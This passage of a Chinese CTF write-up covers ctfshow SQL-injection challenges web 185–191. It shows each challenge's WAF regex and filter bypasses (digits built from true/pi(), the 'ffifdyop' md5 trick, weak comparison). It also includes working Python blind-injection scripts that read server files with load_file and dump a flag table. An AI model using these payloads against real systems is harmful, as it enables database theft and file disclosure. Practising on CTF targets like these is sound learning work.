<span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>可以看到，相比上题，这题多过滤了数字，如果要用之前的十六进制，分别需要获取数字 0-9 和字母 x，A,B,C,D,E,F</p>\n<p>对于数字，在 SQL 中可以利用以下来获取</p>\n<pre><code class=\"language-mysql\">true 1\nfalse 0\nselect true;   --&gt;    1\nselect false;   --&gt;    0\nslect true+true; --&gt;    2\n\n//同时也可以利用ceil，floor来获取如pi(),version()中的数据\nselect pi();    --&gt; 3.141593\nselect floor(pi());   --&gt; 3\nselect ceil(pi());    --&gt; 4\n</code></pre>\n<p>这里已经想到办法获得数字了，下面是字母的获取，这里可以使用 char</p>\n<pre><code class=\"language-mysql\">select char(97);  --&gt;  'a'\n</code></pre>\n<p>于是字母数字均获得，下面是两种思路</p>\n<ol>\n<li>利用 substr/left/right 函数，截取字符串，其截取位置和长度可由 <code>true</code>  来生成，然后使用前面一样的 regexp 进行匹配，其中一种是使用 concat 和 char 连接字符串，一种是只截取一位然后一位一位匹配</li>\n<li>利用 UNHEX 和 concat 函数，其中 concat 用来连接字母数字成十六进制字符串，UNHEX 用来对十六进制进行解码</li>\n</ol>\n<p>下面针对第一个编写脚本</p>\n<pre><code class=\"language-python\"></code></pre>\n<h1 id=\"web-186\"><a class=\"anchor\" href=\"#web-186\">#</a> web 186</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\&lt;|\\&gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>相比之前过滤了 <code>%&lt;&gt;^</code> ，无影响，继续使用上题脚本</p>\n<h1 id=\"web-187\"><a class=\"anchor\" href=\"#web-187\">#</a> web 187</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from ctfshow_user where username = '<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>' and password= '<span class=\"token interpolation\"><span class=\"token variable\">$password</span></span>'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 只有 admin 可以获得 flag</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名不存在'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>经典 md5，输入用户名 <code>admin</code> ，密码 <code>ffifdyop</code></p>\n<p>md5('ffifdyop')=276f722736c95d99e921722cf9ed621c</p>\n<p>将其作为十六进制再解码后，可以得到 <code>'or' 6xxxx</code></p>\n<h1 id=\"web-188\"><a class=\"anchor\" href=\"#web-188\">#</a> web 188</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 用户名检测</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\'|\\\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>弱等于，字符串和数字比较，当字符串 = 0 恒成立，故可 username=0，password=0</p>\n<h1 id=\"web-189\"><a class=\"anchor\" href=\"#web-189\">#</a> web 189</h1>\n<p>提示 flag 在 api/index.php 文件中</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://fc44b510-a611-4cd6-86f7-2d734b41e643.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFlagIndex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    head <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    tail <span class=\"token operator\">=</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"if(locate('ctfshow{',\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"load_file('/var/www/html/api/index.php'))&gt;{0},0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> mid</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        head <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        i <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))&gt;{1},0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                                                                                                               <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                                                                                                                   mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            mid <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> head <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token keyword\">and</span> head <span class=\"token operator\">!=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result <span class=\"token operator\">+</span> <span class=\"token string\">\"}\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    index <span class=\"token operator\">=</span> getFlagIndex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    getFlag<span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-190\"><a class=\"anchor\" href=\"#web-190\">#</a> web 190</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LastEditTime : 2023-07-15 17:59:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Description  : </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>str_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>punctuation </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://4cd908a0-fce3-4625-81ad-18085f85af6e.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(f1ag) from ctfshow_fl0g\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token string\">\"username\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"admin' and if(ascii(substr((</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">),</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1)) &gt; </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mid<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1,2) ='1\"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token string\">\"password\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># print(data)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span>  <span class=\"token operator\">==</span> res<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            left <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><h1 id=\"web-191\"><a class=\"anchor\" href=\"#web-191\">#</a> web 191</h1>\n<p>过滤了 <code>ascii</code> ，使用 <code>ord</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td 